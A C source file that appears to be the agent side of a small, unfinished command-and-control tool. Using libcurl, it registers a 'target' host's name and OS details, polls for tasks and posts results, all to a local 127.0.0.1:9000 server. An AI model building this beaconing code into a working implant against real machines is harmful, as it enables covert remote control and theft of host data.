#include <errno.h>
#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include <stddef.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/utsname.h>
#include "initiate.h"
#include "curl_utils.h"

//ref https://curl.se/libcurl/c/postit2.html

static size_t mem_cb(void *contents, size_t size, size_t nmemb, void *userp);

// int get_host_info(struct agent_info *agent)
// {


// }

bool reg(void)
{
	struct response chunk = {.memory = NULL, .size = 0};
    struct web_comms web = {NULL, 0, NULL};

    if(!curl_prep(&web)) {
        perror("curl_prep failed\n");
        exit(1);
    }

	// Get target hostname.
	// TO DO figure out how to import HOST_NAME_MAX
	char hostbuf[256];
	if (gethostname(hostbuf, sizeof(hostbuf)) == -1) {
		perror("Error acquiring host name.\n");
		return false;
	}

	add_curl_field(web.form, "hostname", hostbuf);

	// Get target OS and version and pass to add_curl_field.
	struct utsname buf1;
	errno = 0;
	if (uname(&buf1) != 0) {
		perror("uname error\n");
		return false;
	}

	add_curl_field(web.form, "os type", buf1.nodename);
	add_curl_field(web.form, "os version", buf1.version);

	// Add submit options to curl field data.
	add_curl_field(web.form, "submit", "send");

	//Registration URL
	const char regurl[19] = "127.0.0.1:9000/reg";

	curl_easy_setopt(web.curl, CURLOPT_URL, regurl);

	curl_easy_setopt(web.curl, CURLOPT_MIMEPOST, web.form);

	// Send data to this function as opposed to writing to stdout.
	curl_easy_setopt(web.curl, CURLOPT_WRITEFUNCTION, mem_cb);

	// Pass chunk to callback function.
	curl_easy_setopt(web.curl, CURLOPT_WRITEDATA, (void *)&chunk);

	// Perform the request, res will get the return code
	web.res = curl_easy_perform(web.curl);

	printf("The data returning from agent registration is %s\n\n", chunk.memory);

	// Check for errors
	if (web.res != CURLE_OK) {
		fprintf(stderr, "curl_easy_perform() failed: %s\n",curl_easy_strerror(web.res));
		return false;
	}

	// Always cleanup.
	curl_easy_cleanup(web.curl);

	free(chunk.memory);

	// Then cleanup the form.
	curl_mime_free(web.form);

	return true;
}

// Takes write_function output and stores it in memory.
// Ref: https://everything.curl.dev/libcurl/callbacks/write
static size_t mem_cb(void *contents, size_t size, size_t nmemb, void *userp)
{
  size_t realsize = size * nmemb;
  struct response *mem = (struct response *)userp;

  char *ptr = realloc(mem->memory, mem->size + realsize + 1);
  if(!ptr) {
    /* out of memory! */
    printf("not enough memory (realloc returned NULL)\n");
    return 0;
  }

  mem->memory = ptr;
  memcpy(&(mem->memory[mem->size]), contents, realsize);
  mem->size += realsize;
  mem->memory[mem->size] = 0;

//   printf("The data in the function is %s\n\n", mem->memory);

  return realsize;
}

bool check_tasks(void)
{
	struct response chunk = {.memory = malloc(0), .size = 0};

	CURL *curl = curl_easy_init();

	if (!curl) {
		fprintf(stderr, "Curl init failed\n");
		return 1;
	}
	// set options / perfour action is the typical pattern seen with curl in C.
	// Param 1 is the curl handle created before.
	// Param 2 is CURLOPT_URL, which then allows you to specify the URL in
	// param 3 that you want download. 
	curl_easy_setopt(curl, CURLOPT_URL, "127.0.0.1:9000/tasks/uuid");

	// This line below specifies what to do with the data when we receive it,
	// as opposed to printing it to stdout. We will pass in a ptr to our own function
	// called got_data in this example. This is known as a call back function.
		// Send data to this function as opposed to writing to stdout.
	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, mem_cb);

		// Pass chunk to callback function.
	curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);

	// set options
	// perform our action
	// curl_easy_perform accepts the options set above and in this case will
	// download the content from the URL.
	// CURLcode resul saves the return code from curl_easy_perform.
	CURLcode result = curl_easy_perform(curl);

  	printf("The data returning from check tasks is %s\n\n", chunk.memory);

	if (result != CURLE_OK) {
		fprintf(stderr, "download problem: %s\n",
			curl_easy_strerror(result));
	}

	curl_easy_cleanup(curl);
	return 0;
}

bool post_results(struct strings_array *sa)
{
	struct response chunk = {.memory = malloc(0), .size = 0};
    struct web_comms web = {NULL, 0, NULL};

    if(!curl_prep(&web)) {
        perror("curl_prep failed\n");
        exit(1);
    }

	add_curl_field(web.form, "task id", "1234");

	add_curl_field(web.form, "task results", sa->words);

	// Add submit options to curl field data.
	add_curl_field(web.form, "submit", "send");

	//Registration URL
	const char resurl[27] = "127.0.0.1:9000/results/uuid";

	curl_easy_setopt(web.curl, CURLOPT_URL, resurl);

	curl_easy_setopt(web.curl, CURLOPT_MIMEPOST, web.form);

	// Send data to this function as opposed to writing to stdout.
	curl_easy_setopt(web.curl, CURLOPT_WRITEFUNCTION, mem_cb);

	// Pass chunk to callback function.
	curl_easy_setopt(web.curl, CURLOPT_WRITEDATA, (void *)&chunk);

	// Perform the request, res will get the return code
	web.res = curl_easy_perform(web.curl);

	printf("The data returning from post results is %s\n\n", chunk.memory);

	// Check for errors
	if (web.res != CURLE_OK) {
		fprintf(stderr, "curl_easy_perform() failed: %s\n",curl_easy_strerror(web.res));
		return false;
	}

	// Always cleanup.
	curl_easy_cleanup(web.curl);

	free(chunk.memory);

	// Then cleanup the form.
	curl_mime_free(web.form);

	return true;
}
